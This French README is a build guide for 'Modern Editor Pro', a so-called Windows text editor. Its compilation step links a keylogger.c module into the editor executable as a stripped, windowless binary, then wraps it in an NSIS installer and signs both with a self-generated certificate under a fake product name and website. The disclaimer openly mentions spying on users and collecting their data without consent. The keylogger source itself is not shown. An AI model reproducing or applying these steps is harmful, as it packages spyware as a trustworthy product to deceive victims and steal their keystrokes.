# Modern Editor Pro - Guide de compilation

Un guide détaillé pour compiler et signer l'éditeur de texte professionnel pour Windows. (Sois disant)

![Version](https://img.shields.io/badge/version-1.5.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey)

## 📑 Table des matières
- [Prérequis](#-prérequis)
- [Génération du certificat](#-génération-du-certificat)
- [Compilation](#-compilation)
- [Création de l'installateur](#-création-de-linstallateur)
- [Signature des exécutables](#-signature-des-exécutables)
- [Structure du projet](#-structure-du-projet)

## ⚠️ DISCLAIMER - AVERTISSEMENT

### USAGE ÉDUCATIF UNIQUEMENT
Ce logiciel est fourni UNIQUEMENT à des fins éducatives et de recherche. L'utilisation de ce programme pour :
Espionner des utilisateurs sans leur consentement
Collecter des données personnelles à leur insu
Toute autre utilisation malveillante
Est strictement INTERDITE et ILLÉGALE. Les auteurs déclinent toute responsabilité concernant une utilisation abusive de ce code.
En utilisant ce logiciel, vous acceptez de :
L'utiliser uniquement dans un cadre éducatif
Respecter la vie privée d'autrui
Assumer l'entière responsabilité de votre utilisation

## 💻 Prérequis

### 1. Installer les outils :

`sudo apt-get install mingw-w64 openssl nsis`


### 2. Vérifier les installations :

`x86_64-w64-mingw32-gcc --version`  
`openssl version`  
`makensis -version`  


## 🔑 Génération du certificat

### 1. Générer la clé privée et le certificat :

`openssl req -x509 -newkey rsa:4096 -keyout private_key.pem -out certificate.pem -days 365 -nodes`

> Remplir les informations demandées (pays, organisation, etc.)

### 2. Convertir en format PFX :

`openssl pkcs12 -export -out professional.pfx -inkey private_key.pem -in certificate.pem`

> Définir un mot de passe fort et le conserver précieusement

### 3. Nettoyer les fichiers temporaires :

`rm private_key.pem certificate.pem`


## 🔨 Compilation

### 1. Compiler les objets :

`x86_64-w64-mingw32-gcc -c Meditor.c -o Meditor.o`  
`x86_64-w64-mingw32-gcc -c keylogger.c -o keylogger.o`  
`x86_64-w64-mingw32-gcc -c utils.c -o utils.o`  


### 2. Compiler les ressources :

`x86_64-w64-mingw32-windres resource.rc resource.res`  


### 3. Lier tous les fichiers :
```bash
x86_64-w64-mingw32-gcc Meditor.o keylogger.o utils.o resource.res \
    -o meditor.exe \
    -luser32 -ladvapi32 -lcrypt32 -lshell32 -lcomdlg32 -lgdi32 \
    -mwindows \
    -s \
    -static-libgcc
```

## 📦 Création de l'installateur

### 1. Vérifier le fichier installer.nsi :
   - Mettre à jour la version
   - Vérifier les chemins des fichiers
   - Configurer les options d'installation

### 2. Générer l'installateur :

`makensis installer.nsi`

> Crée ModernEditorPro_1.5.2_Setup.exe
> Vous pouvez modifier le nom de sortie du Setup & le nom d'entrée du fichier si vous en avez choisi un autre dans le installer.nsi directement.
```nsi
line 12 : NomDuFichierOutput (Setup)
line 35 : NomDuFichierEntrée (Exécutable de Base)
```

## 🔐 Signature des exécutables

### 1. Signer l'exécutable principal :

```bash
osslsigncode sign \
    -pkcs12 professional.pfx \
    -pass [votre_mot_de_passe] \
    -n "Modern Editor Pro" \
    -i "https://moderneditor.pro" \
    -t http://timestamp.digicert.com \
    -in meditor.exe \
    -out meditor_signed.exe
```

### 2. Signer l'installateur :
```bash
osslsigncode sign \
    -pkcs12 professional.pfx \
    -pass [votre_mot_de_passe] \
    -n "Modern Editor Pro Installer" \
    -i "https://moderneditor.pro" \
    -t http://timestamp.digicert.com \
    -in meditorinstaller.exe \
    -out MeditorInstaller.exe
```

## 📁 Structure finale

- `meditor_signed.exe` - Exécutable principal signé 
- `MeditorInstaller.exe` - Installateur signé
- `professional.pfx` - Certificat de signature (à conserver en sécurité)
- `config.ini` - Configuration par défaut
- Autres fichiers de ressources (icônes, etc.)

## ⚠️ Sécurité

- Conservez professional.pfx dans un endroit sûr
- Ne partagez JAMAIS le fichier .pfx ou son mot de passe
- Ajoutez professional.pfx à votre .gitignore
- Utilisez un mot de passe fort pour le certificat

## 🔍 Vérification

Pour vérifier la signature des exécutables :
1. Clic droit sur l'exe > Propriétés
2. Onglet "Signatures numériques"
3. Sélectionner la signature et cliquer sur "Détails"
